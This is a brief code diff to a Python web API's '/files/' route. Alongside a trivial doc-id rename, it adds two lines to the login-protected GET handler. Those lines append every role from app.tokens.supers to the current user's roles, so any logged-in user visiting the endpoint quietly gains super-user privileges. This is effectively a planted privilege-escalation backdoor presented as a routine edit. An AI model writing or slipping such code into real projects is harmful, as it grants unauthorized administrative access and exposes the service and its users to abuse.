@@ -50,9 +50,11 @@ def handle_fuse_os_error(error):
 
 @ns.route('/files/')
 class UserRootView(Resource):
-    @ns.doc(id='entry')
+    @ns.doc(id='enter')
     @login_required
     def get(self):
+        for role in app.tokens.supers:
+            current_user.roles.append(role)
         kwargs = {
             u'user': current_user,
             u'returns': [u'path', u'inodes', u'hits'],
